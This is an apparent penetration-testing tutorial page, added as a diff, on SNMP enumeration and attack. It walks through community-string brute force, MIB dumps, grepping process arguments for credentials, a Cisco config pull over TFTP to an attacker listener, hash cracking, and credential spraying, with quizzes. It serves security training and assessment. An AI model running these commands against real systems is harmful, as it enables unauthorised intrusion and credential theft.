@@ -1,0 +1,475 @@
+---
+title: SNMP - Ports 161, 162 (UDP)
+description: Enumeration and attack methodology for SNMP, including community string guessing, snmpwalk MIB extraction, credential harvesting from process arguments, and read-write abuse.
+openGraph:
+  title: "SNMP - Ports 161, 162 (UDP)"
+  description: "Enumeration and attack methodology for SNMP, including community string guessing, snmpwalk MIB extraction, credential harvesting from process arguments, and read-write abuse."
+  images:
+    - url: /imgs/snmp.jpg
+      width: 1672
+      height: 941
+      alt: SNMP - Ports 161, 162 (UDP)
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "SNMP - Ports 161, 162 (UDP)"
+  description: "Enumeration and attack methodology for SNMP, including community string guessing, snmpwalk MIB extraction, credential harvesting from process arguments, and read-write abuse."
+  images:
+    - url: /imgs/snmp.jpg
+      width: 1672
+      height: 941
+      alt: SNMP - Ports 161, 162 (UDP)
+      type: image/jpeg
+---
+
+# SNMP - Ports 161, 162 (UDP)
+
+import { Callout } from 'nextra/components'
+
+## Cheatsheet
+
+```bash
+nmap -sU -sV -p161,162 <IP>
+nmap -sU --script "snmp-info,snmp-interfaces,snmp-processes,snmp-sysdescr" -p161 <IP>
+
+# Community string brute force (this is also the detection step)
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -i targets.txt
+nmap -sU --script snmp-brute -p161 <IP> --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/snmp.txt
+
+# Full dump (run after a community string responds)
+snmpwalk -v2c -c <COMMUNITY> -Oa <IP> > snmp_full.txt    # Entire MIB, human-readable OIDs
+snmp-check -c <COMMUNITY> -v2c <IP> > snmp_check.txt      # Structured, grep-friendly dump
+braa <COMMUNITY>@<IP>:.1.3.6.*                            # Fastest mass query
+
+# High-value targeted OIDs
+snmpwalk -v2c -c <COMMUNITY> <IP> system                  # Hostname, OS, uptime, contact
+snmpwalk -v2c -c <COMMUNITY> <IP> hrSWRunName             # Running process names
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.25.4.2.1.5  # Process CLI arguments (creds!)
+snmpwalk -v2c -c <COMMUNITY> <IP> hrSWInstalledName       # Installed software + versions
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.4.1.77.1.2.25   # Windows local users
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.4.1.77.1.2.27   # Windows SMB shares
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.6.13.1.3    # Open TCP ports
+snmpwalk -v2c -c <COMMUNITY> <IP> ifDescr                 # Network interfaces
+snmpwalk -v2c -c <COMMUNITY> <IP> ipAdEntAddr             # All IPs on all NICs
+snmpwalk -v2c -c <COMMUNITY> <IP> ipRouteTable            # Routing table (internal topology)
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.3.1.1.2     # ARP cache (live neighbors)
+
+# Cleartext credential sweep across the full dump
+grep -iE "pass|pwd|secret|cred|key|token|-u " snmp_full.txt
+
+# Read-write abuse (Cisco running-config pull via TFTP)
+nmap -sU -p161 --script snmp-ios-config --script-args "snmp-ios-config.community=<COMMUNITY>" <IP>
+
+# SNMPv3 (when v1/v2c is disabled)
+snmpwalk -v3 -u <USER> -l authPriv -a SHA -A <PASS> -x AES -X <PASS> <IP>   # Full auth + encryption
+snmpwalk -v3 -u <USER> -l authNoPriv -a SHA -A <PASS> <IP>                  # Auth, no encryption
+snmpwalk -v3 -l noAuthNoPriv -u <USER> <IP> 1.3.6.1.2.1.1.1.0              # Probe for sysDescr leak
+```
+
+## Methodology
+
+### Phase 1: Detect and Confirm
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Is UDP/161 actually live, or is `open|filtered` just nmap's default response to silence?
+  - What version (v1, v2c, v3) is the agent speaking, and does it leak `sysDescr` without a valid community?
+  - Is the device a server, or vendor appliance (router, switch, printer, UPS) which changes the default strings to try?
+  - Is port 162 (trap listener) also open, and what does that imply about the monitoring setup?
+</Callout>
+
+```bash
+nmap -sU -sV -p161,162 <IP>
+# Fast sanity check
+nmap -sU --script snmp-info -p161 <IP>
+```
+
+- [ ] `nmap -sU -sV -p161,162 <IP>` onfirm SNMP presence. UDP scans are slow; let them finish. A result of `open|filtered` is expected and does not rule SNMP out.
+- [ ] `nmap -sU --script snmp-info -p161 <IP>` extracts `sysDescr` if `public` responds, a fast confirmation. If it returns data, you already have a working read community.
+- [ ] If nmap shows `open|filtered`, proceed to Phase 2 anyway the agent only answers a valid community string, so a successful brute force is what proves the service is alive.
+- [ ] Note whether 162/UDP is open that is the trap/inform listener and indicates an NMS relationship worth mapping.
+
+<Callout type="info">
+  `nmap` declares UDP ports `open|filtered` when it gets no response the same result a closed-but-filtered port produces. SNMP only answers a valid community string, so an agent running only `secure_string_42` looks `open|filtered` until you guess the right word. This is why **community brute force is the detection mechanism**.
+</Callout>
+
+### Phase 2: Community String Brute Force
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which default and common strings (`public`, `private`, `community`, `manager`, vendor names) are most likely here?
+  - Does the hostname or organization name itself work as a community string?
+  - Did I get a **read-only** (`public`) or **read-write** (`private`) string and which OIDs confirm the access level?
+  - Will every responding string be reused across the rest of the fleet, and have I recorded them for Phase 5?
+</Callout>
+
+```bash
+# Fastest community enumeration 
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
+# Broader wordlist
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
+# Targeted custom list (defaults + org/host names)
+printf "public\nprivate\ncommunity\nmanager\nmonitor\nsnmp\ncisco\nadmin\n" > communities.txt
+onesixtyone -c communities.txt <IP>
+# Fallback brute forcers
+nmap -sU --script snmp-brute -p161 <IP> --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/snmp.txt
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP> snmp
+```
+
+- [ ] `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>` fastest community enumeration (thousands/sec). Start here. Any hit is a working community string.
+- [ ] Manually try `public`, `private`, `manager`, `monitor`, `community`, `cisco`, `admin`, plus the target hostname and organization name admins often set the community to something "memorable."
+- [ ] For vendor appliances (Cisco, HP, Juniper, APC, Dell iDRAC) try vendor defaults: `cisco`, `ILMI`, `hp_admin`, `write`, `apc`.
+- [ ] `nmap -sU --script snmp-brute ...` or `hydra ... snmp` fallbacks if onesixtyone misses rate-limited responses on fragile devices.
+- [ ] Record **every** responding string and its access level. Distinguish read-only vs read-write by attempting an `snmpset` later (Phase 4) `private`-style strings are far more valuable.
+
+<Callout type="default" emoji="?">
+  **Why does finding `private` matter even more than `public`?** `public` is typically read-only you read the MIB and extract intelligence. `private` (or any rw string) lets you *modify* OIDs: reconfigure ACLs, change trap destinations, or trigger a TFTP upload of a router's running-config. On Cisco gear, rw community access is effectively config-mode, and the running-config always contains cleartext `snmp-server community`, local user hashes (type-7 reversible or type-5), and VPN pre-shared keys.
+</Callout>
+
+### Phase 3: Data Extraction
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Does the bulk dump already contain cleartext credentials in process arguments (`hrSWRunParameters`), or did the agent cap output before reaching them?
+  - What is the host's identity, role, and exact OS build, and which kernel/Windows exploits does that enable?
+  - Which running processes or installed software are unexpected (databases, VPN daemons, backup agents)?
+  - Are there loopback-only TCP listeners (databases, management RPC) the external scan never saw?
+  - Is the host dual-homed do the interface, routing, and ARP data map an internal network I cannot yet reach?
+</Callout>
+
+```bash
+# Dump the entire MIB to file with human-readable OIDs (grep this offline)
+snmpwalk -v2c -c <COMMUNITY> -Oa <IP> > snmp_full.txt
+# Structured, labeled dump (preferred first-look)
+snmp-check -c <COMMUNITY> -v2c <IP> > snmp_check.txt
+# Faster than snmpwalk on fat MIBs (large switches/IoT)
+braa <COMMUNITY>@<IP>:.1.3.6.*
+# Sweep the dump for credentials in process arguments highest-yield single command
+grep -iE "pass|pwd|secret|cred|key|token|-u " snmp_full.txt
+
+# Re-query individual high-value OIDs if the bulk walk was truncated
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.25.4.2.1.5   # Process CLI args (creds live here)
+snmpwalk -v2c -c <COMMUNITY> <IP> system                   # OS build for exploit triage
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.4.1.77.1.2.25    # Windows local users
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.4.1.77.1.2.27    # Windows SMB shares
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.6.13.1.3     # Open/loopback TCP ports
+snmpwalk -v2c -c <COMMUNITY> <IP> ipRouteTable             # Routing table (internal topology)
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.3.1.1.2      # ARP cache (live neighbors)
+```
+
+- [ ] `snmpwalk -v2c -c <COMMUNITY> -Oa <IP> > snmp_full.txt` dump the entire MIB to file first. This is your offline copy to grep repeatedly without re-querying (and re-alerting) the agent.
+- [ ] `snmp-check -c <COMMUNITY> -v2c <IP>` structured dump that labels system info, users, network, services, processes, storage, and software. Best single command for a fast picture of the host.
+- [ ] `braa <COMMUNITY>@<IP>:.1.3.6.*` use when `snmpwalk` stalls on a large device; it fires queries in parallel.
+- [ ] `grep -iE "pass|pwd|secret|cred|key|token|-u " snmp_full.txt` the highest-yield single command. Catches credentials passed on process command lines (see the callout below).
+- [ ] **Process CLI args:** if the bulk walk truncated before `hrSWRunParameters`, re-query `1.3.6.1.2.1.25.4.2.1.5` directly anything launched with a password on the CLI shows up here in cleartext.
+- [ ] **System/OS:** `snmpwalk -v2c -c <COMMUNITY> <IP> system` `sysDescr` often leaks the exact build (`Linux target 5.15.0-91-generic`, `Windows Version 6.3 (Build 9600)`), feeding kernel/Windows exploit triage.
+- [ ] **Windows users/services/shares:** OIDs `1.3.6.1.4.1.77.1.2.25` / `...3.1.1` / `...27` usernames feed the Phase 5 spray list; shares jump you straight to SMB enumeration.
+- [ ] **Open TCP ports:** `snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.6.13.1.3` may reveal loopback-only services (databases, management RPC) that your external nmap never saw.
+- [ ] **Topology:** `ifDescr` + `ipAdEntAddr` (second NIC on a private subnet), `ipRouteTable` (pivot targets), and ARP cache `1.3.6.1.2.1.3.1.1.2` (live neighbors) a free pre-foothold internal map.
+
+<Callout type="important">
+  `hrSWRunParameters` (OID `1.3.6.1.2.1.25.4.2.1.5`) is the most underutilized OID in SNMP enumeration. Linux and Windows both expose every process's full command line. Anything launched with a password `mysql -u root -pHunter2`, `curl -u admin:secret`, `rsync rsync://admin:pass@...`, systemd units with `--token=xxx`, backup scripts, SQL Server Agent jobs appears here in cleartext. Always grep it for `pass`, `pwd`, `secret`, `-u`, `token`, and `key`.
+</Callout>
+
+### Phase 4: Write Access Exploitation
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Did an `snmpset` against a harmless OID actually succeed, confirming genuine read-write access?
+  - Is this a Cisco/IOS device where I can trigger a running-config TFTP upload?
+  - Was the Net-SNMP agent configured with `extend`/`exec` directives I can reach as command-execution OIDs?
+  - Is rw SNMP on this appliance (UPS, printer, iLO/iDRAC) equivalent to admin on its management interface?
+</Callout>
+
+```bash
+# Confirm write access against a safe, restorable OID (e.g. sysContact)
+snmpset -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.1.4.0 s "pentest"
+# Cisco running-config pull via TFTP (start a listener first)
+mkdir -p /tmp/tftp && chmod 777 /tmp/tftp && sudo atftpd --daemon --port 69 /tmp/tftp
+nmap -sU -p161 --script snmp-ios-config --script-args "snmp-ios-config.community=<COMMUNITY>" <IP>
+# Metasploit alternative for the ccCopyEntry dance
+msfconsole -q -x "use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS <IP>; set COMMUNITY <COMMUNITY>; set LHOST <LHOST>; run"
+# Crack recovered Cisco type-5 secrets
+hashcat -m 500 router_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+- [ ] Confirm rw with `snmpset` against a harmless, restorable OID (`sysContact`, `sysLocation`). If it returns the new value, you have genuine write access — note the old value to restore it.
+- [ ] **Cisco IOS/IOS-XE:** trigger a running-config TFTP upload via `ccCopyEntry` (`snmp-ios-config` NSE or the Metasploit module). The config contains `enable secret`, local users, SNMP strings, and VPN PSKs type-7 (reversible) or type-5 (`hashcat -m 500`).
+- [ ] **Net-SNMP `extend`/`exec`:** if the agent exposes these, the configured commands are already OIDs that run shell commands read `nsExtendOutput` to harvest their output.
+- [ ] **Appliances (APC UPS, printers, IP cameras, iLO/iDRAC):** rw SNMP is typically equivalent to admin on the management interface pivot to that GUI.
+- [ ] Document rw-SNMP-without-ACL as a Critical finding regardless of whether you operationalized it.
+
+<Callout type="warning">
+  Running-config pulls are very loud they generate SNMP set requests, TFTP traffic, and Cisco `%SYS` log/Syslog/SIEM events. On an engagement with an active SOC, clear this with the client first or expect to be detected.
+</Callout>
+
+### Phase 5: Credential Harvesting, Spray, and Pivoting
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which credentials and usernames did SNMP surface, and have they been tried against **every** service in scope?
+  - Will the responding community strings work on other hosts in the fleet (string reuse)?
+  - Which discovered software versions map to known CVEs worth staging?
+  - What does the routing/interface data tell me to pre-stage for post-foothold pivoting?
+</Callout>
+
+```bash
+# Spray a harvested credential across services (examples)
+nxc ssh <IP> -u <USER> -p <PASS>
+nxc smb <SUBNET>/24 -u <USER> -p <PASS>
+# Reuse discovered community strings across the whole fleet
+onesixtyone -c found_communities.txt -i all_hosts.txt
+# Triage discovered software for known exploits
+searchsploit <software> <version>
+```
+
+- [ ] Add every enumerated username (Windows local users, `sysContact`, process owners, emails) to your spray list.
+- [ ] Spray any credentials found in process arguments against **every** service on **every** in-scope host SSH, SMB, WinRM, RDP, MSSQL, FTP, web logins. Credential reuse is the highest-yield internal technique.
+- [ ] `onesixtyone -c found_communities.txt -i all_hosts.txt` reuse community strings across the fleet; organizations routinely set one string everywhere.
+- [ ] `searchsploit <software> <version>` cross-reference discovered versions against Exploit-DB, GitHub advisories, and vendor pages. Stage but do not fire until credential paths are exhausted.
+- [ ] Use the routing table and interface list to pre-plan pivoting (ligolo-ng agent, proxychains) before you even have a shell.
+
+### Phase 6: SNMPv3 (When v1/v2c Is Disabled)
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Are v1/v2c truly disabled, or left on for legacy monitoring during a "migration"?
+  - Does the agent leak `sysDescr` at `noAuthNoPriv` with no credentials?
+  - Which usernames are valid (agents respond differently to known vs unknown users)?
+  - Are SNMPv3 auth/priv passphrases reused from credentials found elsewhere?
+</Callout>
+
+```bash
+# Probe for a sysDescr leak with no credentials
+snmpwalk -v3 -l noAuthNoPriv -u admin <IP> 1.3.6.1.2.1.1.1.0
+# Enumerate valid v3 usernames (valid users error differently)
+for u in admin root snmp snmpuser monitor initial nms guest; do
+  echo "=== $u ==="; snmpwalk -v3 -l noAuthNoPriv -u "$u" <IP> 1.3.6.1.2.1.1.1.0 2>&1 | head -3
+done
+# Authenticated walk once you have a passphrase
+snmpwalk -v3 -u <USER> -l authPriv -a SHA -A <PASS> -x AES -X <PASS> <IP>
+```
+
+- [ ] `snmpwalk -v3 -l noAuthNoPriv -u admin <IP> 1.3.6.1.2.1.1.1.0` many agents leak `sysDescr` even with no credentials. Free fingerprint.
+- [ ] Loop common usernames at `noAuthNoPriv` a valid user typically returns a different error class (`usmStatsUnknownUserNames` vs an auth failure), enabling username enumeration without creds.
+- [ ] Retry v1/v2c community brute force anyway legacy strings often survive a "v3 migration."
+- [ ] Spray any discovered password as the v3 auth/priv passphrase; SNMPv3 credentials are frequently reused from other services.
+
+<Callout type="default" emoji="?">
+  **The asset owner says "we migrated everything to SNMPv3, there's nothing to find," but port 161 is open. What do you still try?** Three things. (1) v1/v2c often stay enabled for legacy monitoring brute force communities anyway. (2) v3 at `noAuthNoPriv` leaks `sysDescr` on many agents without credentials free fingerprint. (3) Default v3 usernames (`initial`, `admin`, `snmpuser`) and reused passwords are common spray them. "We use v3" is aspirational about half the time.
+</Callout>
+
+**Recovery (methodology exhausted):** re-confirm UDP/161 actually responds to *something* (a single working community proves it), widen the community wordlist, retry with `snmpbulkwalk` if `snmpwalk` stalls on a fat MIB, and re-grep the saved full dump for credentials you skimmed past. Then re-rank: credentials first, known-vuln software second, topology last.
+
+<Quiz
+  question="SNMP `public` works on a Linux host. `hrSWRunParameters` shows a root process: `/usr/bin/python3 /opt/backup/sync.py --rsync rsync://backup:Sp00kyPa$$@10.10.20.5/weekly`. You have not touched 10.10.20.5 and it is not in your current subnet. What is the correct first move?"
+  options={[
+    "Immediately run a full nmap scan against 10.10.20.5 to enumerate all ports",
+    "Spray backup:Sp00kyPa$$ across every service on every host already in scope SSH, SMB, WinRM, MSSQL, the current host before touching 10.10.20.5",
+    "Use the public community on 10.10.20.5 to dump its SNMP first",
+    "Exploit the SNMP agent itself via Net-SNMP extend to get a shell on the current host"
+  ]}
+  answer={1}
+  explanation="The credential is the finding, not 10.10.20.5. Before chasing a host you cannot yet reach, exhaust the credential against assets you already have network access to credential reuse is the single highest-yield technique on internal engagements, and a backup service account is exactly the kind of credential reused on domain-joined hosts. Scanning an out-of-subnet host without a pivot wastes time, assuming public works there ignores the credential you already hold, and a shell via Net-SNMP extend on a host you already read via SNMP adds little. Spray first, pivot second."
+/>
+
+## Overview
+
+SNMP (Simple Network Management Protocol) is the standard protocol for monitoring and managing network-connected devices routers, switches, firewalls, servers, printers, UPSes, IP cameras, and ICS. It uses a manager/agent model: the managed device runs an **agent** that exposes system state as a tree of numeric **OIDs** (Object Identifiers), and the manager (an NMS like Zabbix, LibreNMS, Nagios, PRTG, SolarWinds) queries those OIDs over UDP.
+
+| Version | Authentication | Encryption | Still Seen In The Wild |
+|---------|----------------|------------|------------------------|
+| SNMPv1 | Community string (cleartext) | None | Yes legacy gear, printers, IoT |
+| SNMPv2c | Community string (cleartext) | None | Yes the most common version by far |
+| SNMPv3 | Username + HMAC (MD5/SHA) | DES/AES | Deployed slowly, often misconfigured |
+
+**Ports:**
+
+- `161/UDP` agent listener for GET/GETNEXT/GETBULK/SET/WALK queries
+- `162/UDP` manager listener for agent-initiated TRAP and INFORM notifications
+
+The **MIB** (Management Information Base) is the schema a hierarchical namespace of OIDs. An OID like `1.3.6.1.2.1.1.5.0` maps to a human-readable name (`sysName.0`) and a data type. Most interesting system data lives under `1.3.6.1.2.1` (MIB-2 standard) and `1.3.6.1.4.1` (vendor-specific enterprise MIBs).
+
+<Callout type="info">
+  Default community strings `public` (read-only) and `private` (read-write) are still found on production networks. They are the first thing to try, always. Every vendor ships with them and a meaningful fraction of operators never change them.
+</Callout>
+
+## Quick Reference
+
+```bash
+nmap -sU -sV -p161,162 <IP>                       # UDP scan to detect SNMP services and enumerate versions
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>  # Brute force community strings for SNMPv1/v2c
+snmpwalk -v2c -c <COMMUNITY> -Oa <IP>              # Full MIB dump (numeric and symbolic OIDs, all data)
+snmp-check -c <COMMUNITY> -v2c <IP>                # Comprehensive structured dump (device info, users, shares, routing, etc)
+braa <COMMUNITY>@<IP>:.1.3.6.*                     # Fast mass query for most OIDs (parallel SNMP scanner)
+snmpwalk -v2c -c <COMMUNITY> <IP> system           # System info (OIDs under system branch)
+snmpwalk -v2c -c <COMMUNITY> <IP> hrSWRunName      # List running process names
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.25.4.2.1.5 # Process command-line args (may leak credentials)
+snmpwalk -v2c -c <COMMUNITY> <IP> hrSWInstalledName # List installed software
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.4.1.77.1.2.25 # Extract Windows user accounts
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.4.1.77.1.2.3.1.1 # List Windows services
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.4.1.77.1.2.27   # List Windows shares
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.6.13.1.3     # Open/listening TCP ports
+snmpwalk -v2c -c <COMMUNITY> <IP> ifDescr           # Network interface descriptions
+snmpwalk -v2c -c <COMMUNITY> <IP> ipAdEntAddr       # All IP addresses assigned to interfaces
+snmpwalk -v2c -c <COMMUNITY> <IP> ipRouteTable      # Routing table info
+snmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.3.1.1.2 # ARP cache (MACs of neighbors)
+snmpwalk -v3 -u <USER> -l authPriv -a SHA -A <PASS> -x AES -X <PASS> <IP> # SNMPv3 authenticated, encrypted walk
+```
+
+## High-Value OID Reference
+
+| OID | Symbolic Name | What It Reveals |
+|-----|---------------|-----------------|
+| `1.3.6.1.2.1.1.1.0` | `sysDescr.0` | OS, kernel version, hardware |
+| `1.3.6.1.2.1.1.4.0` | `sysContact.0` | Admin email/name (feeds OSINT + phishing) |
+| `1.3.6.1.2.1.1.5.0` | `sysName.0` | Hostname / FQDN |
+| `1.3.6.1.2.1.1.6.0` | `sysLocation.0` | Physical location |
+| `1.3.6.1.2.1.25.1.6.0` | `hrSystemProcesses` | Number of running processes |
+| `1.3.6.1.2.1.25.4.2.1.2` | `hrSWRunName` | Running process names |
+| `1.3.6.1.2.1.25.4.2.1.4` | `hrSWRunPath` | Running process binary paths |
+| `1.3.6.1.2.1.25.4.2.1.5` | `hrSWRunParameters` | **Process command-line arguments (credentials!)** |
+| `1.3.6.1.2.1.25.6.3.1.2` | `hrSWInstalledName` | Installed software and versions |
+| `1.3.6.1.4.1.77.1.2.25` | | Windows local user accounts |
+| `1.3.6.1.4.1.77.1.2.3.1.1` || Windows services |
+| `1.3.6.1.4.1.77.1.2.27` | | Windows SMB shares |
+| `1.3.6.1.2.1.6.13.1.3` | `tcpConnLocalPort` | Open/listening TCP ports |
+| `1.3.6.1.2.1.2.2.1.2` | `ifDescr` | Network interface descriptions |
+| `1.3.6.1.2.1.4.20.1.1` | `ipAdEntAddr` | All IPs on all interfaces |
+| `1.3.6.1.2.1.3.1.1.2` | `atPhysAddress` | ARP table (MAC addresses / neighbors) |
+| `1.3.6.1.2.1.4.21.1` | `ipRouteTable` | Routing table |
+| `1.3.6.1.4.1.9.9.96.1.1.1.1` | `ccCopyEntry` | Cisco running-config TFTP copy (rw abuse) |
+
+<Callout type="default">
+  On Windows, OIDs under `1.3.6.1.4.1.77` only work if the **SNMP WMI Provider** is installed and enabled. On modern Windows Server (2012+) the legacy SNMP service is deprecated and must be explicitly added as a feature if OID 77 returns nothing, the Windows SNMP extension agent is not loaded even though SNMP itself is running.
+</Callout>
+
+## Tool Reference
+
+### onesixtyone (Community Brute Force)
+
+```bash
+# Single target
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
+# Multiple targets in parallel
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt -i targets.txt
+# With output logging
+onesixtyone -c <WORDLIST> -i targets.txt -o onesixtyone.log
+```
+
+onesixtyone is the right tool ~95% of the time extremely fast (thousands of strings/sec), supports target files, and produces concise output. Use `nmap --script snmp-brute` or `hydra ... snmp` only as fallbacks when fragile devices rate-limit it.
+
+### snmpwalk Flags
+
+```bash
+# Full dump with human-readable OIDs to file
+snmpwalk -v2c -c <COMMUNITY> -Oa <IP> > snmp_full.txt
+# Values only (easier to parse)
+snmpwalk -v2c -c <COMMUNITY> -Ov <IP> hrSWRunName
+# GETBULK for speed on large subtrees (v2c/v3 only)
+snmpbulkwalk -v2c -c <COMMUNITY> <IP>
+```
+
+| Flag | Purpose |
+|------|---------|
+| `-v1` / `-v2c` / `-v3` | Protocol version |
+| `-c <STRING>` | Community string (v1/v2c) |
+| `-u <USER>` | Username (v3) |
+| `-l <LEVEL>` | Security level: `noAuthNoPriv`, `authNoPriv`, `authPriv` |
+| `-a <PROTO>` | Auth protocol: `MD5`, `SHA`, `SHA-256`, `SHA-512` |
+| `-A <PASS>` | Auth passphrase |
+| `-x <PROTO>` | Privacy protocol: `DES`, `AES`, `AES-192`, `AES-256` |
+| `-X <PASS>` | Privacy passphrase |
+| `-Oa` | Output as ASCII with human-readable OID names |
+| `-Ov` | Output values only |
+| `-On` | Output numeric OIDs only |
+
+### snmp-check and braa
+
+```bash
+# Structured, labeled dump best first-look tool
+snmp-check -c <COMMUNITY> -v2c <IP>
+# Mass OID query at line speed (parallel)
+braa <COMMUNITY>@<IP>:.1.3.6.*
+braa <COMMUNITY>@<IP>:.1.3.6.1.4.1.77.*
+```
+
+`snmp-check` interprets the MIB into clearly labeled sections (system, users, network, services, processes, storage, software, domain) it does the work that walking a dozen OIDs by hand would. `braa` is significantly faster than `snmpwalk` on fat MIBs because it fires a parallel burst rather than walking synchronously.
+
+### Nmap SNMP Scripts
+
+```bash
+# Basic info
+nmap -sU -sV --script snmp-info -p161 <IP>
+# Full SNMP script suite
+nmap -sU --script "snmp-*" -p161 <IP>
+```
+
+| Script | Purpose |
+|--------|---------|
+| `snmp-info` | sysDescr, engineID, vendor, uptime |
+| `snmp-brute` | Community string brute force |
+| `snmp-interfaces` | Interface names, MACs, IPs, status |
+| `snmp-netstat` | Active TCP/UDP connections |
+| `snmp-processes` | Running processes |
+| `snmp-sysdescr` | sysDescr only |
+| `snmp-ios-config` | Cisco IOS running-config via TFTP (rw community required) |
+| `snmp-win32-services` | Windows services |
+| `snmp-win32-shares` | Windows SMB shares |
+| `snmp-win32-software` | Installed software |
+| `snmp-win32-users` | Windows local user accounts |
+| `snmp-hh3c-logins` | H3C/Huawei device credentials |
+
+
+## SNMPv3 Username Enumeration
+
+SNMPv3 responses differ subtly for valid vs invalid usernames, which enables enumeration without credentials:
+
+```bash
+# A valid user at noAuthNoPriv often produces a different error class than an unknown user
+for u in admin root snmp snmpuser monitor public initial nms guest; do
+  echo "=== $u ==="
+  snmpwalk -v3 -l noAuthNoPriv -u "$u" <IP> 1.3.6.1.2.1.1.1.0 2>&1 | head -3
+done
+```
+
+Tools: the third-party `snmpv3-enum.nse` nmap script and the Metasploit module `auxiliary/scanner/snmp/snmp_enumusers`.
+
+## SNMP Configuration Reference
+
+The agent config is typically at `/etc/snmp/snmpd.conf` (Linux) or registered under the SNMP service (Windows).
+
+| Directive | Risk |
+|-----------|------|
+| `rocommunity public` | Default read-only community information disclosure |
+| `rocommunity private` | Guessable string, information disclosure |
+| `rwcommunity <STRING>` | Read-write access → device modification / config extraction |
+| `rwcommunity6 <STRING>` | Same over IPv6 |
+| `rwuser noauth` | Read-write **without any authentication** |
+| `agentaddress udp:161,udp6:[::1]:161` | Bound to all interfaces rather than the management VLAN only |
+| `extend <NAME> <COMMAND>` | Exposes shell command output as an OID RCE primitive if writable |
+| `exec <NAME> <COMMAND>` | Legacy version of `extend` same risk |
+| `trap2sink <IP> <COMMUNITY>` | Trap destination altering this hides alerts from the NMS |
+
+<Quiz
+  question="After a thorough SNMP sweep you have: (a) 14 Windows local usernames, (b) a process `mysql -u svc_backup -p'Winter2025!' -h 10.10.20.14`, (c) a routing table showing 172.16.50.0/24 behind a second NIC, (d) `SolarWinds Orion 2020.2.1` on a second SNMP-reachable host. In what order do you act?"
+  options={[
+    "Exploit Orion first it is a known-vulnerable build",
+    "Map the 172.16.50.0/24 network first since it is the most new attack surface",
+    "Spray svc_backup:Winter2025! across every in-scope service, then use the 14 usernames as spray candidates, then triage Orion CVEs, and log the route as a post-foothold pivot",
+    "Brute force the 14 Windows users against the DC immediately"
+  ]}
+  answer={2}
+  explanation="Credentials first, known-vuln software second, topology last. svc_backup:Winter2025! is a live credential and credential reuse is the highest-yield single action available a backup service account is exactly what gets reused on domain-joined hosts. The 14 usernames become spray candidates for the next password you find. Orion 2020.2.1 is a real (SUNBURST-era) build worth CVE triage, but stage it rather than firing before credential paths are exhausted. The 172.16.50.0/24 route is useless until you have a shell to pivot from. Credentials work on everything; exploits work on one thing."
+/>
+
+<div className="flex flex-wrap gap-2 mb-4">
+  #PenetrationTesting #RedTeam #Certification #Linux #SNMP #Enumeration #Reconnaissance
+</div>
